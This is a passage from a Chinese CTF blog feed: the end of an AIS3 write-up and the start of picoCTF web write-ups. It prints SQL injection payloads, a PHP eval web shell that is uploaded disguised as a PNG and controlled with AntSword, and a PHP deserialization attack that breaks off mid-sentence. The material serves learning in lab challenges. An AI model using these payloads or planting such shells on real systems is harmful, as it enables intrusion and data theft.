random.randint(<span class="number">0</span>, <span class="built_in">len</span>(piles) - <span class="number">1</span>)</span><br><span class="line">        count = random.randint(<span class="number">1</span>, <span class="built_in">int</span>(piles[pile]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># winning game, make a winning move</span></span><br><span class="line">        <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(piles):</span><br><span class="line">            v = <span class="built_in">int</span>(v)</span><br><span class="line">            target = v ^ nim_sum</span><br><span class="line">            <span class="keyword">if</span> target &lt; v:</span><br><span class="line">                pile = i</span><br><span class="line">                count = v - target</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (pile, count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>, <span class="number">40004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;what would you like to do?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)  <span class="comment"># start</span></span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># time.sleep(1)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Loop <span class="subst">&#123;now&#125;</span>&quot;</span>)</span><br><span class="line">        text = r.recvuntil(<span class="string">b&quot;it&#x27;s your turn to move! what do you choose?&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(text.decode())</span><br><span class="line">        r.sendline(<span class="string">b&quot;1&quot;</span>)  <span class="comment"># stop and save</span></span><br><span class="line">        r.recvuntil(<span class="string">b&quot;here is your saved game:\n&quot;</span>)</span><br><span class="line">        line = r.recvline().decode().strip()</span><br><span class="line">        info = line.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        piles = info[<span class="number">0</span>].split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(piles)</span><br><span class="line">        <span class="built_in">hash</span> = info[<span class="number">1</span>]</span><br><span class="line">        which_pile, how_many = get_move(piles)</span><br><span class="line">        r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;enter the saved game:&quot;</span>)</span><br><span class="line">        r.sendline(line.encode())</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;it&#x27;s your turn to move! what do you choose?&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&quot;0&quot;</span>)  <span class="comment"># choose to move</span></span><br><span class="line">        which_pile = <span class="built_in">str</span>(which_pile).encode()</span><br><span class="line">        how_many = <span class="built_in">str</span>(how_many).encode()</span><br><span class="line">        <span class="built_in">print</span>(which_pile, how_many)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">type</span>(which_pile), <span class="built_in">type</span>(how_many))</span><br><span class="line">        r.sendline(which_pile)</span><br><span class="line">        r.sendline(how_many)</span><br><span class="line">        now += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p>運行了幾次後發現，怎麼每次都是輸阿?難道我寫錯了嗎?</p><p>經過幾次對 ChatGPT 的詠唱發現自己並沒有寫錯，問題是出在我沒有看到題目有給原始碼…。看了一下後發現原來題目在一開始生成遊戲的時候就已經註定了先手(我們)會輸的結局。如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    print_main_menu()</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;what would you like to do? &quot;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        print_rules()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        game = Game()</span><br><span class="line">        game.generate_losing_game() <span class="comment"># 這邊，他生成了我們會輸的遊戲局面</span></span><br><span class="line">        play(game)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        saved = <span class="built_in">input</span>(<span class="string">&quot;enter the saved game: &quot;</span>).strip()</span><br><span class="line">        game_str, digest = saved.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hash</span>.hexdigest(game_str.encode()) == digest:</span><br><span class="line">            game = Game()</span><br><span class="line">            game.load(game_str)</span><br><span class="line">            play(game)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_error(<span class="string">&quot;invalid game provided!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;omg bye!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>至此，我的思路就有點卡住了。本來還以為題目設計可以讓我們中途暫停退出，然後用輸入 hash 值得方式繼續剛才的遊戲是為了讓我們可以判斷一下現在的局面，暫停退出先計算出下一步然後再回來繼續遊戲。結果當 Hint 出來的時候說明不要照著規則玩，我整個就失去方向了，所以最後還是不知道怎麼解的。(到現在在寫 writeup 都還是真的好好奇)</p><h1 id="Forensics">Forensics</h1><p>這次好像把 Forensic 的題目都放在 Misc 裡面了所以跳過這 Part</p><h1 id="My-Thoughts">My Thoughts</h1><p>在這次參賽完之後，我明顯的體認到了自己的不足之處。就是那種，已經很努力了而且賽期也花了絕大部分的時間在比賽上面，成績卻還是不理想。也更加清楚的知道自己還需要修煉，還有很長一段路得走。</p><p>每次參加資安的活動、課程等等，看到那些厲害的學長姐們聚在一起聊天的時候常常會幻想自己有天也能躋身在他們的行列，也是因此，我打算在暑假的時候好好修煉！期待下學期的自己可以多多參加 CTF 比賽，並且爭取得到些成績。在這次暑假中我也會把我每次練習題目的 Writeup 放在我的個人網站上，如果有任何理解錯誤的地方也歡迎大家指正！</p><blockquote><p>Do not go gentle into that good night; Old age should burn and rave at close of day. Rage, rage against the dying of the light.&quot; – <strong><em>Interstellar</em></strong></p></blockquote><h1 id="Reference">Reference</h1><p>有鑑於我認為自己在資訊這個領域中，如果能有任何的成就或是進展，很大部分的原因都是站在了許多巨人的肩膀上，所以我會把比賽過程中用到的資源都放上來。</p><p>不僅僅是為了致敬及感謝，更要提醒自己，自己的不足及渺小。</p><ul><li><a href="https://www.books.com.tw/products/0010884220">駭客廝殺不講武德：CTF 強者攻防大戰直擊</a></li><li><a href="https://scist.org/blog/2020/10/27/2020%20SCIST%20Web/">2020/10/24 Web Security 基礎 題解</a></li><li><a href="https://blog.csdn.net/vanarrow/article/details/107846987">CTF Crypto RSA 算法 入门总结（全）</a></li><li><a href="https://blog.csdn.net/orchid_sea/article/details/134164177">CTF-RSA 加密-1</a></li><li><a href="https://blog.csdn.net/ISHobbyst/article/details/108918079">CTF-Crypto-RSA 基本原理及常见攻击方法</a></li><li><a href="https://blog.csdn.net/qq_45198339/article/details/128741483">CTF 学习笔记——RSA 加密</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10227814">『 Day 29』拜託別 Pwn 我啦！ - Buffer Overflow</a></li><li><a href="https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/">PWN 入門 - buffer overflow 是什麼？</a></li><li><a href="https://mks.tw/2976/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-buffer-overflow">[資訊安全] 從毫無基礎開始 Pwn – Buffer Overflow 實作</a></li><li><a href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a></li><li><a href="https://blog.gtwang.org/linux/linux-cut-command-tutorial-and-examples/">Linux 的 cut 擷取部份字元、欄位指令教學與常用範例整理</a></li><li><a href="https://medium.com/vswe/bash-shell-script-cheat-sheet-15ce3cb1b2c7">Bash Script 語法解析</a></li><li><a href="https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html">linux 特殊符号大全</a></li><li><a href="https://blog.csdn.net/u012060033/article/details/104310372">Linux 中特殊符号的作用</a></li><li><a href="https://feifei.tw/learn-linux/">[新手入門] 003 Linux 指令教學</a></li><li><a href="https://www.anquanke.com/post/id/85007">【CTF 攻略】FlappyPig HCTF2016 Writeup</a></li><li><a href="https://blog.csdn.net/mochu7777777/article/details/110004233">BUUCTF：[CFI-CTF 2018]webLogon capture</a></li></ul><p>雖然已經盡力回想及搜尋過程中有用到的資源，但可能還是會有些漏網之魚，還請見諒。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> AIS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>All-in-One PicoCTF Writeups</title>
      <link href="/posts/4f98706e/"/>
      <url>/posts/4f98706e/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。</p><p>自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。</p><h1 id="Web">Web</h1><h2 id="unminify">unminify</h2><p>先看題目，點開後他會說如果你打開了這個網頁，代表你的瀏覽器已經收到了 flag，只是他不知道要怎麼讀取它。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091116470.png" alt="題目"></p><p>既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用<code>Ctrl+F</code>搜尋<code>picoCTF</code>字串，結果就直接找到了 XD。欸不是這題也太水了吧！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091535175.png" alt="利用開發者工具搜尋flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;pr3tty_c0d3_dbe259ce&#125;</span><br></pre></td></tr></table></figure><h2 id="picobrowser">picobrowser</h2><p>這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。<img src="https://hackmd.io/_uploads/SJB9S0p70.png" alt="題目"><br>他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">my_user_agent = <span class="string">&quot;picobrowser&quot;</span> <span class="comment"># 這裡把agent改為picobrowser</span></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">f&quot;--user-agent=<span class="subst">&#123;my_user_agent&#125;</span>&quot;</span>)</span><br><span class="line">service = Service(executable_path=ChromeDriverManager().install())</span><br><span class="line">driver = webdriver.Chrome(service=service, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://jupiter.challenges.picoctf.org/problem/28921/flag&quot;</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>這樣就得到 flag 了！</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;p1c0_s3cr3t_ag3nt_84f9c865&#125;</span><br></pre></td></tr></table></figure><h2 id="SQLiLite">SQLiLite</h2><p>題目是一個登入頁面。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092406670.png" alt="題目"></p><p>我們先嘗試用<code>admin, admin</code>登入看看。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092632509.png" alt="Login as admin"></p><p>它會說 Login failed，但是我們可以看到它的 SQL 查詢語句是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號<code>' OR 1=1--</code>登入就可以啦，密碼不用輸入，或是隨便輸入也行。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093002857.png" alt="Logged in"></p><p>但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用<code>Ctrl+F</code>搜尋吧！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093133835.png" alt="flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;L00k5_l1k3_y0u_solv3d_it_d3c660ac&#125;</span><br></pre></td></tr></table></figure><h2 id="More-SQLi">More SQLi</h2><p>把題目 launch 了之後會進入到一個登入頁面，如下圖。</p><p><img src="https://hackmd.io/_uploads/BySNOmYUC.png" alt="題目"></p><p>然後我們先嘗試使用<code>admin</code>作為帳號密碼登入。帳號密碼都輸入<code>admin</code>後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。</p><p><img src="https://hackmd.io/_uploads/r1wnu7KIR.png" alt=""></p><p>圖片有點小，總之他顯示的內容就是像下面這樣:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br><span class="line">SQL query: SELECT id FROM users WHERE password = &#x27;admin&#x27; AND username = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>所以我們在這邊把密碼用<code>'OR 1=1 --</code>這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27; AND username = &#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>可以從上面的代碼高亮的顏色發現，在<code>1=1</code>後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:</p><p><img src="https://hackmd.io/_uploads/rJjw6XYUC.png" alt=""></p><p>他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做<code>sqlite_master</code>的表來儲存一些表格的各種資訊。（<a href="https://blog.csdn.net/luoshabugui/article/details/108327936">資訊來源</a>）</p><p>知道這些候我們輸入<code>' UNION SELECT name, sql, 1337 FROM sqlite_master; --</code>讓整個 SQL 語句變成如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> name, <span class="keyword">sql</span>, <span class="number">1337</span> <span class="keyword">FROM</span> sqlite_master; <span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure><p>這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:</p><p><img src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="找到flag所在的表格了"></p><p>我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload<code>' UNION SELECT 1, flag, 1 FROM more_table; --</code>。輸入後就可以看到以下的介面啦！</p><p><img src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="flag"></p><p>flag 就找到囉！</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a&#125;</span><br></pre></td></tr></table></figure><h2 id="Trickster">Trickster</h2><p>這題的題目是一個可以上傳 png 的網頁，看起來就是文件上船漏洞，頁面如下:</p><p><img src="https://hackmd.io/_uploads/HkocKNtIA.png" alt="題目"></p><p><s>秉持著不知道要幹嘛的時候先掃路徑的精神</s>，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /instructions.txt</span><br><span class="line">Disallow: /uploads/</span><br></pre></td></tr></table></figure><p>既然它都禁止了，我們就去看看吧 XD。<code>/uploads/</code>應該就是它的上船後的文件路徑了，而它 instructions.txt 的內容如下:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s create a web app for PNG Images processing.</span><br><span class="line">It needs to:</span><br><span class="line">Allow users to upload PNG images</span><br><span class="line">look for &quot;.png&quot; extension in the submitted files</span><br><span class="line">make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain &#x27;PNG&#x27; in hexadecimal: &quot;50 4E 47&quot; )</span><br><span class="line">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.</span><br></pre></td></tr></table></figure><p>所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為<code>.png</code>；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為<code>50 4E 47</code>。</p><p>知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為<code>hack.png</code>）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為<code>hack.png.php</code>，並在檔案內容的 PNG 以下添加這個<a href="https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">php 一句話木馬</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>整個修改完後如下（點開來看可能會比較清楚）:</p><p><img src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="一句話木馬"></p><p>上傳完成後，現在這個 shell 就會位於<code>https://my_instance_url/uploads/hack.png.php</code>這個位置上啦。</p><p>接下來再用<a href="https://github.com/AntSwordProject/antSword">中國蟻劍</a>這款工具去連接那個 web shell 就可以啦，連接過程如下:</p><p><img src="https://hackmd.io/_uploads/HJo4cSF8A.png" alt="輸入連接資訊"></p><p>連接完成後，就可以直接看一下網站的文件，看到以下這個<code>.txt</code>應該就是 flag 了。</p><p><img src="https://hackmd.io/_uploads/SyahqSYLR.png" alt="貌似是flag的文件"></p><p><img src="https://hackmd.io/_uploads/HJW1sBtI0.png" alt="flag出來了"></p><p>於是我們就成功找到了 flag 啦！如下:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b&#125;</span><br></pre></td></tr></table></figure><p>這邊補充一個知識點，來講一下<code>&lt;?php @eval($_POST['shell']);?&gt;</code>到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！</p><blockquote><p>當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：</p><ol><li><code>&lt;?php</code> 是 PHP 代碼的開始標記。</li><li><code>@eval($_POST['shell']);</code> 中的 <code>eval()</code> 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 <code>shell</code> 的變量。</li><li><code>@</code> 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。</li><li>由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。</li></ol><p>簡言之，任何通過 <code>shell</code> 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。</p></blockquote><p>然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下<a href="https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18">這篇</a>。</p><h2 id="Super-Serial">Super Serial</h2><p>這題先讀取<code>/robots.txt</code>發現它有一個禁止的路徑為<code>/admin.phps</code>，這似乎代表著它有支持<code>.phps</code>文件。所以可以到<code>/index.phps</code>裡面看它的源代碼。（<code>phps</code>為 PHP source）</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png" alt="index.phps"></p><p>題目說 Flag 在<code>../flag</code>中，所以解題的思路就是要想辦法讀取到<code>../flag</code>。先把圖片上的程式碼拿出來分析一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;cookie.php&quot;</span>;  <span class="comment"># 這裡用到了cookie.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$con</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;../users.db&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line">    <span class="variable">$perm_res</span> = <span class="keyword">new</span> <span class="title function_ invoke__">permissions</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_guest</span>() || <span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_admin</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$perm_res</span>))), <span class="title function_ invoke__">time</span>() + <span class="number">86400</span> * <span class="number">30</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: authentication.php&quot;</span>);  <span class="comment"># 這裡重定向到authentication.php</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;h6 class=&quot;text-center&quot; style=&quot;color:red&quot;&gt;Invalid Login.&lt;/h6&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由於可以透過<code>.phps</code>查看原始代碼，所以先去查看<code>cookie.phps</code>和<code>authentication.phps</code>。可以發現在<code>cookie.php</code>中有以下漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$perm</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])));</span><br><span class="line">        <span class="variable">$g</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_guest</span>();</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Deserialization error. &quot;</span> . <span class="variable">$perm</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把<code>$perm</code>輸出。在<code>authentication.php</code>裡面的<code>access_log</code>這個類中，他定義了<code>__toString()</code>就是讀取並回傳<code>log_file</code>的內容。</p><p>所以我們只要建立一個<code>login</code>的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了<code>login</code>的值為<code>TEST</code>，成功觸發反序列化錯誤的訊息。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png" alt="Deserialization error"></p><p>接著我們用<a href="https://onlinephp.io/">PHP Sandbox</a>來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從<code>cookie.phps</code>中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;TEST&quot;</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>他這邊輸出了<code>czo0OiJURVNUIjs%3D</code>，我們把 cookie 的值修改為這個試試看，能不能正確的輸出<code>TEST</code>。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png" alt="PoC"></p><p>成功！再來我們只需要 new 